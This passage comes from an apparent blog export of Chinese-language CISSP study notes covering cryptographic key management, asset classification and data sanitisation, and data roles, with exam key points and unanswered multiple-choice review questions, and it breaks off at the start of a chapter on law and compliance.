某些情况下，无论是公钥加密还是离线分发，都是不充分的。双方可能需要相互通信，但是他们没有物理手段交换密钥材料，并且没有适当的公钥基础设施来促进秘密密钥的交换。在这样的情况下，像Diffie-Hellman这样的密钥交换算法被证明是极为有用的机制。</li></ul><h5 id="2-存储和销毁对称密钥"><a href="#2-存储和销毁对称密钥" class="headerlink" title="2. 存储和销毁对称密钥"></a>2. 存储和销毁对称密钥</h5><p>　　在对称密钥加密中，另一个主要的挑战是在密码系统中使用的密钥必须进行安全保管。以下给出了存储加密密钥的最佳实践：</p><ul><li>永远不要将加密密钥存储在存放加密数据的同一个系统中，这将使攻击者更容易进行攻击!</li><li>对于敏感的密钥，可以考虑两个不同的人分别持有密钥的一半。他们必须合在一起才能构成完整的密钥。这是众所周知的知识分割原则(己在本章前面提到)。</li></ul><p>当知道密钥的用户离开组织或不再被允许访问通过密钥包含的材料时，密钥必须更改，同时使用该密钥进行加密的所有材料必须用新的密钥进行重新加密。销毁一个密钥并将一个用户从对称密码系统中移除是困难的，这也是组织转而使用非对称算法的一个重要原因。</p><h5 id="3-密钥托管"><a href="#3-密钥托管" class="headerlink" title="3. 密钥托管"></a>3. 密钥托管</h5><p>　　在过去10年中，人们提议通过下列两种主要途径进行密钥托管：</p><ul><li><strong>公平密码系统</strong> 在这种托管方法中，通信中使用的私有密钥被分为两个或多个部分，这些部分都被交给独立的第三方。每个部分本身都是无用的，但是通过重新组合可以获得私有密钥。政府获得法律授权访问特定的密钥时，需要向所有第三方提供法院的证据，随后才能重新组装这个私有密钥。</li><li><strong>托管加密标准</strong> 这种托管方法向政府提供解密密文的技术手段。这个标准是本章前面讨论的Skipjack算法的基础。</li></ul><h4 id="6-4-8-密码生命周期"><a href="#6-4-8-密码生命周期" class="headerlink" title="6.4.8 密码生命周期"></a>6.4.8 密码生命周期</h4><p>　　安全专家在选择一个加密算法和相应的管理控制措施时必须考虑密码的生命周期以确保算法、协议和选择的密钥长度足以保存密码系统的完整性，以确保能够用于保护所需时间内信息的完整性和安全性。安全专家可以使用以下算法和协议管理控制：</p><ul><li>确定组织内可以接受和使用的加密算法(例如，AES、3DES和RSA) 。</li><li>基于传输信息的敏感性确定每个算法可接受使用的密钥长度。</li><li>列出可以使用的安全传输协议(如SSL和TLS) 。</li></ul><h3 id="6-5-考试要点"><a href="#6-5-考试要点" class="headerlink" title="6.5 考试要点"></a>6.5 考试要点</h3><ul><li><strong>理解机密性、完整性和不可否认性在密码系统中扮演的角色</strong> 机密性是密码学的一个主要目标，它确保信息不对未授权的个人泄漏，并且准许加密信息、以在开放的网络中自由传输。对称和非对称密码系统都能够保证机密性。完整性为消息的接收方提供了消息在发送者建立和接收者接收到的时间范围内没有被(有意或无意)修改的保证。对称和非对称密码系统都能够保证完整性。不可否认性提供了不可否认的证据，从而证明消息的发送者确实是这个消息的作者。它防止发送者否认他们发送了原始信息。</li><li><strong>了解如何使用密码系统达到身份认证的目标</strong> 身份认证提供了对用户身份的保证。使用身份认证的一种可能方案是挑战/响应协议，其中的远程用户被要求使用只有通信双方知道的密钥对消息进行加密。对称和非对称的密码系统都可以实现身份认证。</li><li><strong>熟悉密码学的基本术语</strong> 当发送者希望向接收者传送一份私有消息时，发送者会取出明文(未加密的)消息，并且使用某种算法和某个密钥对明文消息进行加密，从而生成发送给接收者的密文消息。接收者随后使用相似的算法和密钥对密文进行解密，并且重建原始的明文消息以供查看。</li><li><strong>理解编码和密码之间的区剔，井且能够解释密码的基本类型</strong> 编码是对词汇或短语操作的符号密码学系统，有时是隐秘的，但是并不能永远提供机密性。不过，密码永远意味着对消息的真实含义进行隐藏。了解下列密码类型的工作方式： 换位密码、替代密码(包括一次性填充)、流密码以及分组密码。</li><li><strong>了解成功应用一次性填充的要求</strong> 要获得成功的一次性填充，密钥必须随机生成，并且不使用任何己知的模式。密钥必须至少和被加密的消息一样长。填充必须防止物理泄露，并且每个填充在被丢弃前必须只使用一次。</li><li><strong>理解零知识证明的概念</strong> 零知识证明是一个通信概念。正如数字签名和数字证书一样，零知识证明交换特定类型的信息，但是不传输实际的数据。</li><li><strong>理解知识分割</strong> 分割知识意味着执行某个操作所需的知识或权限在多个用户之间分配，这样可以确保任何一个人都没有足够的权限来危害环境的安全性。”M of N控制”是分割知识的一个示例。</li><li><strong>理解工作函数(工作因数)</strong> 工作函数或工作因数通过度量解密消息所需的成本和/或时间，来度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函数/因数的值成正比。</li><li><strong>理解密钥安全性的重要性</strong> 密码学密钥为密码系统提供秘密性的必要组件。现代密码系统使用至少128位的密钥来提供足够的安全性。通常，人们都赞同数据加密标准。(DES)56位密钥的长度己无法提供足够的安全性。</li><li><strong>了解对称和非对称密钥系统之间的差异</strong> 对称密钥密码系统(或密钥密码系统)依赖于一个共享密钥的使用。它们的速度远远快于非对称算法，但是缺乏对可扩展性、简单密钥分发和不可否认性的支持。非对称密码系统对双方之间的通信使用公共/私钥对，但是要比对称算法的操作速度慢得多。</li><li><strong>能够解释数据加密标准(DES)和三重DES(3DES)的基本操作模式</strong> 数据加密标准具有4 种操作模式： 电子代码本(ECB)模式、密码分组链接(CBC)模式、密码回馈(CFB)模式和输出回馈(OFB)模式。ECB模式被认为是最不安全的，并且只用于短消息。3DES使用DES的三次选代，利用两或三个不同的密钥，从而将密钥的有效强度各自增加到112位或168位。</li><li><strong>了解高级加密标准(AES)</strong> 高级加密标准使用Rijndael算法，并且是美国政府安全交换敏感但非分类数据的标准。AES使用128、192和256位的密钥和固定128位大小的分组达到比旧的DES算法高得多的安全性。</li></ul><h3 id="6-6-复习题"><a href="#6-6-复习题" class="headerlink" title="6.6 复习题"></a>6.6 复习题</h3><ol><li><p>4位的密钥空间存在多少个密钥?<br>A. 4<br>B. 8<br>C. 16<br>D. 128</p></li><li><p>Jolm近期收到一封来自Bill的电子邮件。需要满足什么密码学目标，才能让John相信Bill是这封邮件的发送者?<br>A. 不可否认性<br>B. 机密性<br>C. 可用性<br>D. 完整性</p></li><li><p>数据加密标准(DES)密码系统中使用的密钥长度是多少?<br>A. 56位<br>B. 128位<br>C. 192位<br>D. 256位</p></li><li><p>什么类型的加密方式，依赖于不断变化消息中字符的位置去实现机密性?<br>A. 流加密<br>B. 换位加密<br>C. 块加密<br>D. 替换加密</p></li><li><p>下列哪一个不是高级加密标准Rijndael算法可能的密钥长度?<br>A. 56位<br>B. 128位<br>C. 192位<br>D. 256位</p></li><li><p>秘密密钥加密系统不能实现下列哪一项?<br>A. 不可否认性<br>B. 机密性<br>C. 可用性<br>D. 密钥分发</p></li><li><p>如果配置正确，己知唯一的牢不可破的加密系统是什么?<br>A. 换位密码<br>B. 替代密码<br>C. 高级加密标准<br>D. 一次性填充</p></li><li><p>数学函数16模3的输出值是多少?<br>A. 0<br>B. 1<br>C. 3<br>D. 5</p></li><li><p>在20世纪40年代，一队来自美国的密码破译专家成功破解了基于一次一密的被称为VENONA的项目。该项目破坏了什么规则，导致引起这个事件?<br>A. 密钥值必须随机<br>B. 密钥值必须和信息一样长<br>C. 密钥值必须仅能被用一次<br>D. 密钥值必须防止物理泄露</p></li><li><p>以下密码类型中，哪一项对大块的消息而不是单个字符或位的消息进行操作?<br>A. 流加密<br>B. 凯撒加密<br>C. 块加密<br>D. ROT3加密</p></li><li><p>为了通过使用对称加密算法对双向通信进行保护，需要的加密密钥的最小数目是多少?<br>A. 1<br>B. 2<br>C. 3<br>D. 4</p></li><li><p>Dave正在开发一个需要多人才能取回密钥的密钥托管系统，但并不依靠每个参与者到现场。他正在使用什么类型的技术?<br>A. 分割知识<br>B. M of N控制<br>C. 工作函数<br>D. 零知识证明</p></li><li><p>下面哪种数据加密标准(DES)操作模式能被用于大量信息，确保在加密/解密过程中不会因为一个早期的错误而破坏整个通信?<br>A. 密码分组链接(CBC)<br>B. 电子代码本(ECB)<br>C. 密码回馈(CFB)<br>D. 输出回馈(OFB)</p></li><li><p>许多加密算法依赖于分解大素数乘积的难题。它们依靠的这个问题的特点是什么?<br>A. 包含扩散<br>B. 包含泪淆<br>C. 包含单向函数<br>D. 遵照Kerchoff原则</p></li><li><p>全面实现有10人参与的对称算法需要多少个密钥?<br>A. 10<br>B. 20<br>C. 45<br>D. 100</p></li><li><p>高级加密标准使用的分块大小是多少?<br>A. 32位<br>B. 64位<br>C. 128位<br>D. 可变</p></li><li><p>什么样的攻击，使得凯撒密码几乎无法使用?<br>A. 中间人攻击<br>B. 托管攻击<br>C. 频率分析攻击<br>D. 换位攻击</p></li><li><p>什么类型的密码系统经常利用一个通道，借助一本著名的书来加密密钥?<br>A. Vernam 加密<br>B. 轮换密钥加密<br>C. Skipjack 加密<br>D. Twofish 加密</p></li><li><p>哪个入围的AES利用了预白噪声化和后白噪声化技术?<br>A. Rijndael<br>B. Twofish<br>C. Blowfish<br>D. Skipjack</p></li><li><p>全面实现有10人参与的非对称算法需要多少个密钥?<br>A. 10<br>B. 20<br>C. 45<br>D. 100</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（5）——保护资产的安全</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%E2%80%94%E2%80%94%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E7%9A%84%E5%AE%89%E5%85%A8/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%E2%80%94%E2%80%94%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E7%9A%84%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：</p><ul><li>A. 人对信息及支持资产进行分类(如敏感性、关键性)</li><li>B. 确定及维护所有权(如数据所有者、系统所有者、业务/任务所有者)</li><li>C. 保护隐私<ul><li>C.l 数据所有者</li><li>C.2 数据处理者</li><li>C.3 数据剩磁</li><li>C.4 收集限制</li></ul></li><li>D. 确保适当地保留资产(如介质、硬件、人员)</li><li>E. 确定数据安全控制(如静态数据、传输过程中的数据)<ul><li>E.l 基准线</li><li>E.2 审视和定制</li><li>E.3 标准选择</li><li>E.4 密码学</li></ul></li><li>F. 建立处理需求(敏感信息的标记、贴签、存储、破坏)</li></ul><h3 id="5-1-对资产进行分类和标记"><a href="#5-1-对资产进行分类和标记" class="headerlink" title="5.1 对资产进行分类和标记"></a>5.1 对资产进行分类和标记</h3><h4 id="5-1-1-定义敏感数据"><a href="#5-1-1-定义敏感数据" class="headerlink" title="5.1.1 定义敏感数据"></a>5.1.1 定义敏感数据</h4><p>　　敏感数据指所有不公开或未分类的信息，可能包括组织需要保护的机密、专有信息，或因数据对组织的价值或组织为遵守现行法律、法规而保护的任何其他类型的数据。</p><ul><li><strong>个人身份信息</strong> 个人身份信息(PII)是指任何可以识别个人的信息。</li><li><strong>受保护的健康信息</strong> 受保护的健康信息(PHI)是任何与个人健康有关的信息。</li><li><strong>专有数据</strong> 专有数据指的是任何帮助组织保持竞争优势的数据。可以是开发的软件代码、产品的技术计划、内部流程、知识产权或商业秘密。</li></ul><h4 id="5-1-2-定义分类"><a href="#5-1-2-定义分类" class="headerlink" title="5.1.2 定义分类"></a>5.1.2 定义分类</h4><p>　　组织通常会在安全策略或在单独的数据策略中包括数据分类。数据分类识别的是数据对于组织的价值，并对数据的机密性和完整性保护至关重要。策略确定了组织内使用的分类标签，还确定了数据所有者如何确定合适的分类以及人员应如何根据分类保护数据。<br><img src="/notes/cissp学习笔记（5）——保护资产的安全/数据分类.png"></p><h4 id="5-1-3-定义数据安全要求"><a href="#5-1-3-定义数据安全要求" class="headerlink" title="5.1.3 定义数据安全要求"></a>5.1.3 定义数据安全要求</h4><p>　　组织至少应该对比较敏感的邮件进行标记和加密。加密是将明文转换为密文，从而增加阅读的难度。采用强大的加密方法，例如，拥有256位加密密钥的高级加密标准(AES 256)，使未被授权者能够阅读加密文章的可能性几乎为零。</p><h4 id="5-1-4-理解数据状态"><a href="#5-1-4-理解数据状态" class="headerlink" title="5.1.4 理解数据状态"></a>5.1.4 理解数据状态</h4><p>　　在数据静止、传输以及使用过程中，保护数据的安全性是非常重要的。保护数据机密性的最好方法是使用强大的加密协议。此外，强大的身份验证和授权控制能有效阻止未经授权的访问。</p><h4 id="5-1-5-管理敏感数据"><a href="#5-1-5-管理敏感数据" class="headerlink" title="5.1.5 管理敏感数据"></a>5.1.5 管理敏感数据</h4><p>　　管理敏感数据的一个主要目标是防止数据泄露。数据泄露会使任何一个未被授权的实体查看或访问敏感数据。</p><h5 id="1-标记敏感数据"><a href="#1-标记敏感数据" class="headerlink" title="1. 标记敏感数据"></a>1. 标记敏感数据</h5><p>　　对敏感数据进行标记(通常称为贴签)能确保用户可以轻松识别任何数据的分类级别。标记或标签提供的最重要信息就是关于数据的分类。标记包括物理的和电子的标记和标签。物理标签能指出存储在介质或处理系统上的数据的安全性分类。</p><h5 id="2-管理敏感数据"><a href="#2-管理敏感数据" class="headerlink" title="2. 管理敏感数据"></a>2. 管理敏感数据</h5><p>　　管理敏感数据是指在介质的整个生命周期内确保传送过程的安全。人们依据数据的价值和分类对其进行不同的管理，高级机密信息需要更强大的保护。</p><h5 id="3-存储敏感数据"><a href="#3-存储敏感数据" class="headerlink" title="3. 存储敏感数据"></a>3. 存储敏感数据</h5><p>　　敏感数据应存储在受保护且没有任何损失的介质中。最有效的保护办法就是加密。此外，也应该采取环境控制来保护介质的数据安全。这些做法包括温度和湿度控制等。这里有一点终端用户经常忘记： 任何敏感数据的价值都大于存储介质的价值。</p><h5 id="4-销毁敏感数据"><a href="#4-销毁敏感数据" class="headerlink" title="4. 销毁敏感数据"></a>4. 销毁敏感数据</h5><p>　　适当的破坏可以确保敏感数据不会落入投机者的手中，从而防止未经授权的数据泄露。</p><ul><li><strong>擦除</strong> 擦除介质上的数据就是对文件、文件的选择或整个介质执行删除操作。</li><li><strong>消除</strong> 消除或重写是使介质可以重新使用的一个准备过程，这个过程可以确保消除的数据不会通过传统的工具恢复。</li><li><strong>清除</strong> 清除是比消除更强烈的一种形式，是指在安全性较差的环境中使介质达到可再次使用的准备过程，确保原始数据使用任何己知方法都不会恢复。</li><li><strong>解除分类</strong> 解除分类是指在非机密情况下对介质或系统进行清除，以使其能够再次使用的准备过程。</li><li><strong>净化</strong> 净化是指从系统或介质中删除数据，确保数据不会以任何形式恢复。</li><li><strong>消磁</strong> 消磁工具会建立一个强大的磁场区域，从而以消磁的方法擦除介质上的数据。</li><li><strong>销毁</strong> 销毁是介质生命周期的最后阶段，也是清除介质数据的最安全方法。</li></ul><h5 id="5-保留资产"><a href="#5-保留资产" class="headerlink" title="5. 保留资产"></a>5. 保留资产</h5><p>　　保留要求适用于数据或记录、含有敏感数据的介质和系统，以及接触敏感数据的人员。记录保留和介质保留是资产保留的最重要元素。记录保留指的是，在需要信息时保留和维护重要的信息，在不需要时破坏信息。</p><h4 id="5-1-6-应用密码学保护机密文件"><a href="#5-1-6-应用密码学保护机密文件" class="headerlink" title="5.1.6 应用密码学保护机密文件"></a>5.1.6 应用密码学保护机密文件</h4><h5 id="1-应用对称加密保护数据"><a href="#1-应用对称加密保护数据" class="headerlink" title="1. 应用对称加密保护数据"></a>1. 应用对称加密保护数据</h5><p>　　对称加密在加密和解密数据一时应用同样的密钥。</p><ul><li><strong>高级加密标准算法</strong> 高级加密标准算法(AES)是众多算法中最受欢迎的对称加密算法。2001年，美国国家标准技术研究所将它选为标准算法，用以替代旧的数据加密标准算法(DES)。高级加密标准支持的密钥长度为128位、192位和256位。</li><li><strong>三重数据加密标准算法</strong> 开发者开发了三重数据加密标准算法(3DES)，用以替代数据加密标准算法(DES)。初始实现使用56位密钥，但是新的算法实现了使用112位或168位密钥。</li><li><strong>Blowfish</strong> Blowfish可用的密钥长度为32位至448位，是一个强大的加密协议。Linux 系统使用bcrypt来加密密码，而bcrypt 这款跨平台文件加密工具就是基于Blowfish。bcrypt添加了额外的128位密钥作为salt值来阻止彩虹表攻击(rainbow table attack) 。</li></ul><h5 id="2-应用传输加密保护数据"><a href="#2-应用传输加密保护数据" class="headerlink" title="2. 应用传输加密保护数据"></a>2. 应用传输加密保护数据</h5><p>　　传输加密算法在传播之前加密数据，对传输过程中的数据进行保护。通过网络发送未加密数据的最主要风险就是嗅探攻击。攻击者可以使用嗅探器或协议分析器在网络上捕捉流量。嗅探器允许攻击者读取所有以明文发送的数据。</p><h3 id="5-2-定义数据角色"><a href="#5-2-定义数据角色" class="headerlink" title="5.2 定义数据角色"></a>5.2 定义数据角色</h3><h4 id="5-2-1-数据所有者"><a href="#5-2-1-数据所有者" class="headerlink" title="5.2.1 数据所有者"></a>5.2.1 数据所有者</h4><p>　　数据所有者是数据的最终责任人。NIST SP 800-18 概括了信息所有者的以下责任，也可以理解为同样是数据所有者的责任：</p><ul><li>制定规则，以便用于主体的数据或信息的适当使用及保护(行为规则)。</li><li>为信息系统所有者提供输入，要考虑到信息所在地的信息系统的安全要求和安全控制。</li><li>决定谁有权访问信息系统，拥有何种特权或准入权。</li><li>协助对信息所在地的普通安全控制进行定义和评估。</li></ul><h4 id="5-2-2-系统所有者"><a href="#5-2-2-系统所有者" class="headerlink" title="5.2.2 系统所有者"></a>5.2.2 系统所有者</h4><p>　　系统所有者是拥有含机密数据的系统的人。NIST SP 800-18 概括了系统所有者的以下责任：</p><ul><li>开发和信息所有者、系统管理者、功能终端使用者相一致的系统安全计划。</li><li>维持系统安全计划井确保系统依照己经同意的安全要求进行部署和运行。</li><li>确保系统使用者和支持人员受到适当的安全培训，如行为规则说明(或是AUP) 。</li><li>当发生重大变化时，更新系统安全计划。</li><li>协助定义、执行和评估通用安全控制。</li></ul><h4 id="5-2-3-业务-任务所有者"><a href="#5-2-3-业务-任务所有者" class="headerlink" title="5.2.3 业务/任务所有者"></a>5.2.3 业务/任务所有者</h4><p>　　NIST SP 800-18 指的是业务/任务所有者作为项目经理或信息系统所有者。同样，业务/任务所有者的责任可以和系统所有者的责任有重叠或相同。业务所有者拥有的程序可能是由其他实体管理的系统。</p><h4 id="5-2-4-数据处理者"><a href="#5-2-4-数据处理者" class="headerlink" title="5.2.4 数据处理者"></a>5.2.4 数据处理者</h4><p>　　欧盟数据保护法将数据处理者定义为”一个自然人或法人，他拥有个人资料，仅代表数据控制者的利益”。在该条文中，数据控制者是一个控制数据过程的人或实体。</p><h4 id="5-2-5-管理员"><a href="#5-2-5-管理员" class="headerlink" title="5.2.5 管理员"></a>5.2.5 管理员</h4><p>　　数据管理员负责将数据以合适的方式授予人员。他们不-定必须拥有全部管理者权限和特权，但是他们可以分配权限。管理员分配权限时需要基于最低权限准则和须知，只有在工作有需要时才会授予使用者。管理员通常会使用基于角色的访问控制模型来分配权限。</p><h4 id="5-2-6-保管者"><a href="#5-2-6-保管者" class="headerlink" title="5.2.6 保管者"></a>5.2.6 保管者</h4><p>　　数据所有者经常将每天的任务委任给保管者。通过以适当方式保存和保护数据，保管者协助保护数据的安全性和完整性。在实际中，信息技术部门的人员或者系统安全管理员通常会成为保管者。他们可能是负责分配权限的相同管理员。</p><h4 id="5-2-7-用户"><a href="#5-2-7-用户" class="headerlink" title="5.2.7 用户"></a>5.2.7 用户</h4><p>　　用户就是任何通过计算系统获取数据并完成工作任务的人。用户只能获取他们需要用来完成工作任务的数据。</p><h3 id="5-3-保护隐私"><a href="#5-3-保护隐私" class="headerlink" title="5.3 保护隐私"></a>5.3 保护隐私</h3><p>　　组织有义务保护他们收集和保存的数据。很多法律要求组织披露他们收集到的数据、收集数据的原因以及准备怎样使用这些信息。此外，这些法律禁止组织以正当使用信息之外的方法使用这些信息。在保护隐私时，组织通常会使用一些不同的安全控制。选择适当的安全控制是一项令人生畏的任务，尤其是对于那些新成立的组织而言。然而，使用安全基准线以及定义相关标准让这项任务变得更简单。</p><h4 id="5-3-1-使用安全基线"><a href="#5-3-1-使用安全基线" class="headerlink" title="5.3.1 使用安全基线"></a>5.3.1 使用安全基线</h4><p>　　基线提供了一个起点，确保最低安全标准。各组织使用的一条普通的基线就是镜像。将系统设置成安全状态之后，审计程序要周期性地检查系统，以确保他们维持在安全状态。NIST SP 800-53 讨论了作为安全控制列表的安全控制基准线。它强调，单一的安全控制不能适用于所有情况，但是任何组织都可以选择一组基准线安全控制，并且根据需求做出调整。</p><h4 id="5-3-2-审视和定制"><a href="#5-3-2-审视和定制" class="headerlink" title="5.3.2 审视和定制"></a>5.3.2 审视和定制</h4><p>　　审视是指评估基线安全控制，然后只选择那些适用于想保护的盯系统的控制。定制是指修改基线内的安全控制列表，使其与组织的使命相适应。</p><h4 id="5-3-3-选择标准"><a href="#5-3-3-选择标准" class="headerlink" title="5.3.3 选择标准"></a>5.3.3 选择标准</h4><p>　　在选择基线内的安全控制时，组织需要确保控制符合某些外部安全标准。外部元素通常定义了对组织的强制性要求。</p><h3 id="5-4-考试要点"><a href="#5-4-考试要点" class="headerlink" title="5.4 考试要点"></a>5.4 考试要点</h3><ul><li><strong>理解数据分类的重要性</strong> 数据所有者负责定义数据分类，确保系统和数据被正确标记。此外，数据所有者定义保护不同分类的数据的需求，比如对静态数据和传输中的敏感数据进行加密。数据分类通常在安全策略或数据策略中定义。</li><li><strong>知道PII和PHI</strong> 个人身份信息(PII)是任何可以识别个人的信息。受保护的健康信息(PHI)是指任何与特定个人的健康有关的信息。许多法律、法规都规定保护PII和PHI。</li><li><strong>知道如何处理敏感信息</strong> 敏感信息是指所有类型的机密信息，正确地管理它们可以帮助防止由于未经授权的披露而失去保密。适当的管理包括标志、处理、存储和破坏敏感信息。组织经常漏掉标记的两个区域是充分保护承载敏感信息的备份介质以及在介质和设备生命周期结束时对其进行净化。</li><li><strong>理解记录保留</strong> 记录保留策略确保在需要数据时，将数据保存在可用状态，在不需要数据时将其破坏。许多法律、法规都规定数据要在特定的时间内进行保存，但是没有正式的规定，因此组织会在策略中指定保留时间。审计跟踪数据需要保持足够长的时间来重建过去的事件，但是组织必须确定他们想要调查多久之前的数据。许多组织当前的趋势是通过对电子邮件实施短期保留策略来减少法律责任。</li><li><strong>知道不同角色之间的区别</strong> 数据所有者负责分类、标记和保护数据。系统所有者负责处理数据的系统。业务和任务所有者拥有流程，并确保系统对组织的价值。数据处理者通常是为组织处理数据的第三方实体。管理员基于数据所有者提供的指导方针授权访问数据。用户在执行工作任务的过程中访问数据。保管者负责日常存储和保护数据。</li><li><strong>了解7 条安全港原则</strong> 欧盟数据保护法规定保护隐私数据。第三方同意遵守7 条安全港原则，以确保它们遵守欧盟数据保护法。7 条原则是通知、选择、向前传输、安全性、数据完整性、访问和执行。</li><li><strong>了解安全控制基线</strong> 安全控制基线提供一份组织可以用作基线的控制清单，并不是所有的基线适用于所有的组织。然而，组织可以应用审视和定制技术来选择满足自身需求的基线。</li></ul><h3 id="5-5-复习题"><a href="#5-5-复习题" class="headerlink" title="5.5 复习题"></a>5.5 复习题</h3><ol><li><p>下面哪一项指的是分类过程的主要目的?<br>A. 定义保护敏感数据的要求<br>B. 定义备份数据的要求<br>C. 定义存储数据的要求<br>D. 定义传输数据的要求</p></li><li><p>在确定数据分类时，以下哪一项是最重要的考虑因素?<br>A. 处理系统<br>B. 价值<br>C. 存储介质<br>D 可访问性</p></li><li><p>以下哪个答案不属于敏感数据?<br>A. 个人身份信息(PII)<br>B. 受保护的健康信息(PHI)<br>C. 专有数据<br>D 发布在网站上的数据</p></li><li><p>标记介质的最重要方面是什么?<br>A. 日期标签<br>B. 内容描述<br>C. 电子标签<br>D. 分类</p></li><li><p>在将分类介质再次用到不太安全的环境中之前，管理员通常会怎样做?<br>A. 擦除<br>B. 消除<br>C. 消除<br>D. 重写</p></li><li><p>以下哪个描述正确表述了净化方法的问题?<br>A. 没有移除数据的方法，保证了未授权人员不能检索数据。<br>B. 即使已被完全焚烧的介质也会提供可推断出的数据。<br>C. 人员可能会不适当地执行净化步骤。<br>D. 存储的数据被物理销毁介质。</p></li><li><p>以下哪个选项是摧毁固态硬盘上数据的最可靠方法?<br>A. 擦除<br>B. 去磁<br>C. 删除<br>D. 清除</p></li><li><p>以下哪个选项是删除DVD上数据的最安全方法?<br>A. 格式化<br>B. 删除<br>C. 销毁<br>D. 去磁</p></li><li><p>以下哪一项不会擦除数据?<br>A. 消除<br>B. 清除<br>C. 重写<br>D. 剩磁</p></li><li><p>以下哪一项基于Blowfish并能保护免受彩虹表袭击?<br>A. 3DES<br>B. AES<br>C. bcrypt<br>D. SCP</p></li><li><p>管理员会用以下哪一项来安全连接远程服务器以进行管理?<br>A. Telnet<br>B. 安全文件传输协议(SFTP)<br>C. 安全拷贝(SCP)<br>D. 安全外壳(SSH)</p></li><li><p>以下哪一项是保管者通常会执行的任务?<br>A. 访问数据<br>B. 分类数据<br>C. 分配数据权限<br>D. 备份数据</p></li><li><p>以下哪个数据角色最可能有权授予用户对数据的访问权?<br>A. 管理员<br>B. 保管者<br>C. 所有者<br>D. 用户</p></li><li><p>以下哪一项是对数据所有者确立的”行为规则”的最好定义?<br>A. 确保用户只被授予对他们所需东西的访问权。<br>B. 决定对系统有访问权的人。<br>C. 识别对数据的恰当使用和保护。<br>D. 对系统实施安全控制。</p></li><li><p>在欧盟数据保护法的背景下，以下哪一个是数据处理者?<br>A. 代表数据控制者处理个人数据的实体<br>B. 控制数据处理的实体<br>C. 处理数据的计算系统<br>D. 处理数据的网络</p></li><li><p>通知、选择、向前传输及访问原则最适用的是?<br>A. 保密<br>B. 识别<br>C. 保留<br>D. 分类</p></li><li><p>组织正在实施安全控制的预选基线，但发现不是所有的控制都适用。他们应该做些什么呢?<br>A. 不管怎样，实施所有控制<br>B. 确定另一条基线<br>C. 重新创建一条基线<br>D. 根据他们的需求定制基线</p></li></ol><p>在回答问题18至20时请参考下面的场景：一个组织有一个数据中心，24小时全天处理高级敏感信息。数据中心包括电子邮件服务器，管理员会清理超过6个月的电子邮件，以遵守组织的安全策略。对数据中心的访问是受控制的，所有处理敏感信息的系统都进行了标记。管理员定期备份在数据中心处理的数据。他们在现场保留一份备份，并把没有标记的备份发送到公司的一个仓库。仓库工人按日期整理介质，他们有过去20年的备份。员工白天在仓库工作，晚上和周末在离开前会将仓库锁闭。最近，仓库发生了盗窃，丢失了所有的离线备份磁带。之后，他们数据的副本，包括几年前的敏感电子邮件，开始出现在互联网网站上，因此组织的内部敏感数据被公开。</p><ol start="18"><li><p>在下面的选项中，哪一项可以在不牺牲安全性的情况下阻止此丢失事件的发生?<br>A. 标记场地外保存的介质<br>B. 不要把数据存储在场地外<br>C. 将场地外的备份全部摧毁<br>D. 使用安全的场地外存储设备</p></li><li><p>以下哪个管理员行为可以阻止此事件的发生?<br>A. 在把磁带送到仓库之前对它们进行标记<br>B. 在磁带上备份数据之前清理磁带<br>C. 在磁带上备份数据之前对磁带进行去磁<br>D. 将磁带加入资产管理数据库</p></li><li><p>在以下选项中，关于备份介质不遵守哪一项策略?<br>A. 介质销毁<br>B. 记录保留<br>C. 配置管理<br>D. 版本控制</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（4）——法律、法规和合规性</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84%E6%80%A7/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84%E6%80%A7/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>C. 合规性<ul><li>C.l 法律和法规遵从</li><li>C.2 隐私需求遵从</li></ul></li><li>D. 理解全球范围内涉及信息安全的法律和法规问题<ul><li>D.l 计算机犯罪</li><li>D.2 许可和知识产权(例如，版权、商标、数字版权管理)</li><li>D.3 进口/出口控制</li><li>D.4 跨境数据流</li><li>D.5 隐私</li><li>D.6 数据破坏</li></ul></li></ul><h3 id="4-1-法律的分类"><a href="#4-1-法律的分类" class="headerlink" title="4.1 法律的分类"></a>4.1 法律的分类</h3><h4 id="4-1-1-刑法"><a href="#4-1-1-刑法" class="headerlink" title="4.1.1 刑法"></a>4.1.1 刑法</h4><p>　　刑法形成了法律体系的基石，维护着我们所处社会的和平和安全。刑法包含针对某些行为的禁令，如谋杀、伤害、抢劫、纵火和类似的犯罪行为。对违反刑法的处罚有一个范围，包括强制性劳教、以罚金形式的货币处罚(或多或少)、以监狱判决形式剥夺公民自由权。</p><h4 id="4-1-2-民法"><a href="#4-1-2-民法" class="headerlink" title="4.1.2 民法"></a>4.1.2 民法</h4><p>　　民法形成了法律体系的大部分。它们用于维护社会秩序，并管理不属于犯罪行为但需要一位公正的仲裁者来解决的个人之间和组织之间的问题。民法还被用于创建政府框架，行政机构使用这个体系架构来履行自己的职责。</p><h4 id="4-1-3-行政法"><a href="#4-1-3-行政法" class="headerlink" title="4.1.3 行政法"></a>4.1.3 行政法</h4><p>　　